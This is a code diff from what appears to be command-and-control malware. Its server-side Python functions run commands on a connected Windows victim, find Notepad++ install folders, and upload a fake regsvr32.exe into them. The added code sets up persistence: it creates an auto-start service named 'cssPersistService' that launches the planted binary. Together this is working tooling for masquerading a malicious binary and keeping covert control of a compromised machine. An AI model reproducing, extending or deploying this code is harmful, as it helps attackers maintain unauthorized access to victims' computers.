@@ -8,11 +8,23 @@ def find_npp_task(client: socket.socket):
 
 
 def find_npp_dir(client: socket.socket) -> str:
-    return server.call_exec(client, "where /r C:\\Users *npp*.exe")
+    return server.call_exec(client, "where /r C:\\Users *npp*.exe".replace("\n", ""))
+
+
+def find_regsvr32(client: socket.socket) -> str:
+    return server.call_exec(client, "where /r C:\\Users regsvr32.exe".replace("\n", ""))
 
 
 def send_regsvr32(client: socket.socket, dir: str):
     server.call_upload(client, (config.ITR_CLIENT_FILEPATH, f"{dir}\\regsvr32.exe"))
+
+
+def call_persist_startup(client: socket.socket):
+    executable_path = find_regsvr32(client)
+    time.sleep(3)
+    server.call_exec(
+        client, f"sc create cssPersistService binPath= {executable_path} start= auto"
+    )
 
 
 def found_npp_handler(client: socket.socket):
